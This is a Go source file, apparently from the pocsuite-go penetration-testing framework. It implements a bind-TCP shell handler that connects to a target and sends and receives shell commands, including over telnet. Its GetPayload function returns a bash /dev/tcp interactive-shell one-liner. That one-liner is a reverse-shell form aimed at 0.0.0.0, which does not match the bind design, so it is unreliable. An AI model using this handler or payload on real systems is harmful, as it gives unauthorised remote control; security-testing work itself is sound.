package listener

import (
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/seaung/pocsuite-go/config"
	"github.com/seaung/pocsuite-go/modules/interfaces"
)

type BindTCPListener struct {
	bindHost  string
	bindPort  int
	conn      net.Conn
	running   bool
	runningMu sync.RWMutex
	manager   *ListenerManager
	config    *config.Config
}

func NewBindTCP(config *config.Config) *BindTCPListener {
	return &BindTCPListener{
		bindHost: "",
		bindPort: 0,
		running:  false,
		config:   config,
	}
}

func (r *BindTCPListener) Name() string {
	return "bind_tcp"
}

func (r *BindTCPListener) Init() error {
	if bindHost, ok := r.config.Get("BindTCP", "bind_host"); ok {
		r.bindHost = bindHost
	}
	if bindPort, ok := r.config.Get("BindTCP", "bind_port"); ok {
		if port, err := parsePort(bindPort); err == nil {
			r.bindPort = port
		}
	}

	return nil
}

func (r *BindTCPListener) IsAvailable() bool {
	r.runningMu.RLock()
	defer r.runningMu.RUnlock()
	return r.running
}

func (r *BindTCPListener) Start() error {
	r.runningMu.Lock()
	defer r.runningMu.Unlock()

	if r.running {
		return fmt.Errorf("bind tcp listener is already running")
	}

	if r.bindHost == "" || r.bindPort == 0 {
		return fmt.Errorf("bind host and port must be specified")
	}

	var err error
	r.conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", r.bindHost, r.bindPort), 10*time.Second)
	if err != nil {
		return fmt.Errorf("failed to connect to %s:%d: %w", r.bindHost, r.bindPort, err)
	}

	r.running = true

	go r.redirectIO()

	fmt.Printf("Bind TCP listener connected to %s:%d\n", r.bindHost, r.bindPort)

	return nil
}

func (r *BindTCPListener) Stop() error {
	r.runningMu.Lock()
	defer r.runningMu.Unlock()

	if !r.running {
		return fmt.Errorf("bind tcp listener is not running")
	}

	r.running = false

	if r.conn != nil {
		r.conn.Close()
	}

	return nil
}

func (r *BindTCPListener) redirectIO() {
	for {
		r.runningMu.RLock()
		if !r.running {
			r.runningMu.RUnlock()
			break
		}
		r.runningMu.RUnlock()

		buffer := make([]byte, 4096)
		n, err := r.conn.Read(buffer)
		if err != nil {
			if r.running {
				fmt.Printf("Connection error: %v\n", err)
			}
			break
		}

		fmt.Printf("Received: %s\n", string(buffer[:n]))
	}
}

func (r *BindTCPListener) SendCommand(command string) error {
	r.runningMu.RLock()
	defer r.runningMu.RUnlock()

	if !r.running || r.conn == nil {
		return fmt.Errorf("bind tcp listener is not running")
	}

	_, err := r.conn.Write([]byte(command + "\n"))
	return err
}

func (r *BindTCPListener) ReadResponse(timeout time.Duration) (string, error) {
	r.runningMu.RLock()
	defer r.runningMu.RUnlock()

	if !r.running || r.conn == nil {
		return "", fmt.Errorf("bind tcp listener is not running")
	}

	r.conn.SetReadDeadline(time.Now().Add(timeout))

	buffer := make([]byte, 4096)
	n, err := r.conn.Read(buffer)
	if err != nil {
		return "", err
	}

	return string(buffer[:n]), nil
}

func (r *BindTCPListener) CheckConnection() error {
	if r.bindHost == "" || r.bindPort == 0 {
		return fmt.Errorf("bind host and port must be specified")
	}

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", r.bindHost, r.bindPort), 5*time.Second)
	if err != nil {
		return err
	}
	conn.Close()

	return nil
}

func (r *BindTCPListener) SetBindHost(host string) {
	r.bindHost = host
}

func (r *BindTCPListener) SetBindPort(port int) {
	r.bindPort = port
}

func (r *BindTCPListener) SetManager(manager *ListenerManager) {
	r.manager = manager
}

func (r *BindTCPListener) GetBindAddress() string {
	return fmt.Sprintf("%s:%d", r.bindHost, r.bindPort)
}

func (r *BindTCPListener) ListClients() []interfaces.Client {
	r.runningMu.RLock()
	defer r.runningMu.RUnlock()

	if !r.running || r.conn == nil {
		return []interfaces.Client{}
	}

	return []interfaces.Client{
		{
			Conn:    r.conn,
			Address: r.conn.RemoteAddr(),
		},
	}
}

func (r *BindTCPListener) GetClient(index int) (*interfaces.Client, error) {
	r.runningMu.RLock()
	defer r.runningMu.RUnlock()

	if index != 0 {
		return nil, fmt.Errorf("invalid client index for bind_tcp listener (only index 0 is valid)")
	}

	if !r.running || r.conn == nil {
		return nil, fmt.Errorf("bind_tcp listener is not connected")
	}

	return &interfaces.Client{
		Conn:    r.conn,
		Address: r.conn.RemoteAddr(),
	}, nil
}

func (r *BindTCPListener) GetConnection() net.Conn {
	r.runningMu.RLock()
	defer r.runningMu.RUnlock()
	return r.conn
}

func (r *BindTCPListener) GetPayload() string {
	return fmt.Sprintf("bash -i >& /dev/tcp/0.0.0.0/%d 0>&1", r.bindPort)
}

func (r *BindTCPListener) BindShell(host string, port int, check bool) error {
	r.bindHost = host
	r.bindPort = port

	if check {
		if err := r.CheckConnection(); err != nil {
			return fmt.Errorf("bind shell is not accessible: %w", err)
		}
	}

	return r.Start()
}

func (r *BindTCPListener) BindTelnetShell(host string, port int, user string, password string, check bool) error {
	r.bindHost = host
	r.bindPort = port

	if check {
		if err := r.CheckConnection(); err != nil {
			return fmt.Errorf("telnet bind shell is not accessible: %w", err)
		}
	}

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 10*time.Second)
	if err != nil {
		return fmt.Errorf("failed to connect to telnet: %w", err)
	}

	r.conn = conn
	r.running = true

	go r.redirectIO()

	fmt.Printf("Telnet bind shell connected to %s:%d\n", host, port)

	return nil
}
